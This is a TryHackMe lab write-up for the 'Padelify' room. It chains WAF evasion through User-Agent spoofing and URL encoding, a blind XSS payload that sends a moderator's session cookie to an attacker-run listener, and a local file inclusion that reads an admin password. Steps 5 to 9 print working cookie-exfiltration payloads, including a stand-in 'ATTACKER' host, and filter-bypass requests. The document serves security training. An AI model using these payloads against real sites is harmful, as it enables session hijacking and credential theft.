# 🏴‍☠️ TryHackMe: Padelify  
**Difficulty:** 🟠 Medium  

![Room Badge](https://tryhackme-badges.s3.amazonaws.com/manio11.png)

🔗 [View the room on TryHackMe](https://tryhackme.com/room/padelify)

---

> **Disclaimer:**  
> This write-up is for educational and professional demonstration purposes only.  
> All testing was performed in a controlled, authorized environment (TryHackMe).  
> No techniques described here were used against real-world systems.

---

## About This Write-Up
This document is part of my offensive security portfolio.  
My goal is to present structured, professional case studies that demonstrate practical penetration testing skills, clear reporting, and a real-world methodology.

These write-ups are meant to demonstrate practical offensive security skills relevant to junior pentesting, red teaming, and application security roles.

---

## 🧠 Summary
**Padelify** is a web exploitation challenge focused on **WAF bypass techniques**, **blind XSS exploitation**, and **local file inclusion (LFI)**.  
The attack chain involves bypassing a **signature-based Web Application Firewall**, stealing a **moderator session cookie via blind XSS**, and abusing a vulnerable `page` parameter to read sensitive configuration files.

**Key themes:**
- Web Application Firewall evasion  
- Blind Cross-Site Scripting (XSS)  
- Cookie exfiltration  
- Parameter fuzzing  
- Local File Inclusion (LFI)  
- URL encoding bypass techniques  

---

## 🧰 Tools & Techniques

| Tool / Technique | Purpose |
|------------------|---------|
| **nmap** | Port scanning & service discovery |
| **Gobuster** | Directory & parameter fuzzing |
| **curl** | Manual HTTP testing |
| **Python HTTP server** | XSS exfiltration listener |
| **CyberChef** | URL encoding |
| **WAF evasion** | User-Agent spoofing, string splitting |
| **Blind XSS** | Stored payload execution |

---

## 🚀 Attack Path

### 1. Reconnaissance with nmap

```bash
nmap -Pn 10.67.171.240
```
| Port | Service |
| ---- | ------- |
| 22   | SSH     |
| 80   | HTTP    |

I navigated to `http://10.67.171.240` and discovered a registration and login page.  
Registration required moderator approval, indicating a manual verification workflow.  
Interestingly, logging in with the credentials `test:test` succeeded, suggesting either a misconfiguration or leftover test account.  
Since this behavior was not required for exploitation, I continued with the main challenge.

---

### 2. Initial Web Access & WAF Detection
```
curl 10.67.171.240
```
**Response:**
```html
403 FORBIDDEN  
Web Application Firewall is ACTIVE
```
**Observations:**
- Automated tools blocked
- Signature-based WAF detected

---

### 3. WAF Bypass (User-Agent Spoofing)
The Web Application Firewall blocked Gobuster requests based on its default User-Agent,  
indicating **signature-based detection**.

```bash
gobuster dir -u http://10.67.171.240/-w /usr/share/wordlists/dirb/common.txt-a Mozilla/5.0
```
**Results:**
| Path           | Status | Notes         |
| -------------- | ------ | ------------- |
| /config        | 301    | Interesting   |
| /logs          | 301    | Contains logs |
| /css           | 301    | Bootstrap     |
| /js            | 301    | Bootstrap     |
| /index.php     | 200    | Homepage      |
| /php.ini       | 403    | Blocked       |
| /server-status | 403    | Blocked       |

/config is blocked by the firewall but /logs is not. 

**How does this work?**

This works because the WAF relies on **static pattern matching**.  
Automated tools like Gobuster use recognizable User-Agent strings.  
By spoofing a real browser (Mozilla/5.0), we blend into normal traffic.

---

### 4. Log File Analysis

```lua
/logs/error.log
```
**Findings:**
- Possible encoded XSS payload detected
- Failed to parse admin_info in: `/var/www/html/config/app.conf`

**Conclusion:**
- XSS attempts already exist
- Sensitive config file exists
- WAF blocks direct access

---

### 5. Blind XSS Discovery
We now know that we can maybe use a xss payload against the website to get a moderator cookie. first we start with a simple payload and see if we get a response on my own machine.

```html
<img src="http://10.67.101.111:8000" />
```
```bash
python3 -m http.server 8000
```
**Incoming traffic:**
```sql
GET / HTTP/1.1
```
**What this proves:**
- Payload stored server-side
- Admin/moderator views it
- Browser executes it
- We see it remotely → Blind XSS

---

### 6. WAF Evasion – Cookie Exfiltration
First i tried script to test of the firewall will block that, but it didn't so thats good. and the i tried document.cookie but that didn't work. so now iknow the firewall will block it. but document["coo"+"kie"] werkte wel. 

**Blocked:**
```html
<script> var i=new Image(); i.src="http://ATTACKER/?c="+document.cookie </script>
```
**Bypass:**
```html
<script> var i=new Image(); i.src="http://10.67.101.111:9001/?c="+document["coo"+"kie"] </script>
```
```bash
python3 -m http.server 9001
```
**Captured:**
```ini
PHPSESSID=e1omj7ther5rnh0g5ks70vjn84
```

**Why this works?**
- Browser concatenates → cookie
- WAF scans raw input
- Does NOT see "cookie"
- Filter bypassed

---

### 7. Moderator Access
I replaced my cookie with the stolen one.
After refreshing, I was logged in as moderator.

**What is the flag value after logging in as a moderator?**
```text
THM{REDACTED}
```

**Impact:**
- Session hijacking
- Privilege escalation
- Full moderator control

---

### 8. Parameter Fuzzing – LFI
At the beginning of the challenge we found in de /logs file some information about the admin:
- Failed to parse admin_info in /var/www/html/config/app.conf
But the firewall is ofcourse still blocking config/app.conf

So i went looking around and found live.php?page=match.php what could be interesting. 

I tries to fuzz the page parameter to find hidden files or directories.

```bash
gobuster fuzz -u http://10.67.171.240/live.php?page=FUZZ -w /usr/share/wordlists/dirb/common.txt -a Mozilla/5.0 --exclude-length 1907
```
**Results:**
| Path           | Status | Notes         |
| -------------- | ------ | ------------- |
| /config        | 301    | Interesting   |
| /logs          | 301    | Contains logs |
| /css           | 301    | Bootstrap     |
| /js            | 301    | Bootstrap     |
| /index.php     | 200    | Homepage      |
| /php.ini       | 403    | Blocked       |
| /server-status | 403    | Blocked       |

again i found /config and /logs. This time im trying this http://10.67.171.240/live.php?page=/config/app.conf because there is maybe some information about the admin creds. But as expected teh firewall blockes me. Thats the moment im rememberig about encoding techniques and tries URL Encoding.

---

### 9. URL Encoding WAF Bypass
I go to cyberchef and let this /config/app.conf url encoded to %2Fconfig%2Fapp%2Econf. 
I fill it in the url balk and it worked.
```bash
/live.php?page=%2Fconfig%2Fapp%2Econf
```
**Found some admin information**
```ini
admin_info = "bL}8,S9W1o44"
```

**Why this works?**
- WAF inspects RAW request
- Does not decode URL
- Backend decodes internally
- Filter bypassed

---

### 10. Admin Access
I go tot the login page with the username admin and password bL}8,S9W1o44 to retrive the final flag.

**What is the flag value after logging in as admin?**
```
THM{REDACTED}
```

---
## 🏁 Flags
| Flag      | Value                    |
| --------- | ------------------------ |
| Moderator | THM{REDACTED} |
| Admin     | THM{REDACTED}  |

---

## 💭 Reflection
**This room demonstrated how simple, signature-based WAFs can be bypassed using:**
- User-Agent spoofing
- String concatenation
- URL encoding
- Blind XSS showed how stored payloads can lead to full session hijacking.
- The LFI vulnerability demonstrated how poor input validation leads to credential disclosure.

**Key Takeaways:**
- WAFs ≠ security
- Blind XSS is extremely dangerous
- Encoding bypasses defeat filters
- Session hijacking = instant privesc
- Parameter fuzzing is powerful

**Lessons Learned:**
- Test what is filtered
- Break payloads apart
- Combine vulnerabilities
- Log files leak secrets
- Defense-in-depth matters
